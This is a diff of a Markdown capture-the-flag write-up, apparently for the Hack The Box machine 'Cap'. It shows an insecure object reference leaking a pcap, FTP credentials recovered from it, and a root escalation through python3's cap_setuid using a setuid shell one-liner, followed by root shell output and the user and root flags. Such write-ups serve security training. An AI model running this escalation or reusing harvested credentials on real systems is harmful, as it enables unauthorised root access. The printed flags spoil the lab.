@@ -43,7 +43,7 @@ But if we enter to security snapshot, which points to http://10.129.8.16/capture
 To test this, we can change this number, and monitor the results. In the case the object is invalid, we are redirected to the dashboard, however, 
 when we set the number to “0”, we are given a valid capture file that we are able to download.
 
-<img width="1464" height="848" alt="wireshark" src="https://github.com/user-attachments/assets/762fa80d-b420-4df1-94cb-e47e8007efdf" />
+<img width="1596" height="788" alt="dadda" src="https://github.com/user-attachments/assets/a03dd85c-1ca8-40fe-99f1-c9e1667ff75b" />
 
 It shows us the captured packets information. Let’s download the Pcap file and open in wireshark. 
 
@@ -52,16 +52,64 @@ Since FTP is a clear-text protocol, we know there may be credentials captured th
 Once we set the filter, within the first few packets, we see credentials for the nathan user. 
 Credentials: Nathan : Buck3tH4TF0RM3!
 
-<img width="1900" height="557" alt="website" src="https://github.com/user-attachments/assets/1a569526-c9f0-46a0-84ed-b784967a76a0" />
+<img width="1464" height="848" alt="wireshark" src="https://github.com/user-attachments/assets/75030883-1145-45fd-b4d4-5c52eae5dee9" />
+
 
 This Pcap file has username and password for FTP service. Let’s use these credentials to login via SSH and read the user flag.
 
+nathan@cap:~$ ls -la
+total 28
+drwxr-xr-x 3 nathan nathan 4096 May 27  2021 .
+drwxr-xr-x 3 root   root   4096 May 23  2021 ..
+lrwxrwxrwx 1 root   root      9 May 15  2021 .bash_history -> /dev/null
+-rw-r--r-- 1 nathan nathan  220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 nathan nathan 3771 Feb 25  2020 .bashrc
+drwx------ 2 nathan nathan 4096 May 23  2021 .cache
+-rw-r--r-- 1 nathan nathan  807 Feb 25  2020 .profile
+lrwxrwxrwx 1 root   root      9 May 27  2021 .viminfo -> /dev/null
+-r-------- 1 nathan nathan   33 Mar  8 23:49 user.txt
 nathan@cap:~$ cat user.txt
-ce3f90fe646c14a033f2cff997f3b5c4
-
+***ce3f90fe646c14a033f2cff997f3b5c4***
 
 # Privilege Escalation
 
+Let’s run LinPeas to find any escalation paths.
+
+<img width="917" height="155" alt="suidlinpeas" src="https://github.com/user-attachments/assets/faaca0aa-df24-4f06-ba03-af1cfcbfc67b" />
+
+We trying and testing even manual this vulnerability of cap_suid on python.
+
+<img width="882" height="143" alt="capsuid" src="https://github.com/user-attachments/assets/85cb98a8-b45d-4fd5-8232-22e25d440232" />
+
+Cap_setuid’ capability is enabled on python3.8 binary. This simply means, the user has privilege to run this program as root.
+
+Exec the suid exp command:
+
+**python -c 'import os; os.setuid(0); os.system("/bin/sh")'**
+
+```
+nathan@cap:~$ python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+# whoami
+root
+# cd /root/
+# ls -la
+total 36
+drwx------  6 root root 4096 Mar  8 23:49 .
+drwxr-xr-x 20 root root 4096 Jun  1  2021 ..
+lrwxrwxrwx  1 root root    9 May 15  2021 .bash_history -> /dev/null
+-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
+drwxr-xr-x  3 root root 4096 May 23  2021 .cache
+drwxr-xr-x  3 root root 4096 May 23  2021 .local
+-rw-r--r--  1 root root  161 Dec  5  2019 .profile
+drwx------  2 root root 4096 May 23  2021 .ssh
+lrwxrwxrwx  1 root root    9 May 27  2021 .viminfo -> /dev/null
+-r--------  1 root root   33 Mar  8 23:49 root.txt
+drwxr-xr-x  3 root root 4096 May 23  2021 snap
+# cat root.txt
+1d96b9552d8caefcd6e857075c0cc138
+```
+
+<img width="758" height="365" alt="flag2" src="https://github.com/user-attachments/assets/9817b37b-e5a9-46cb-80f4-8671c0475b85" />
 
 
 
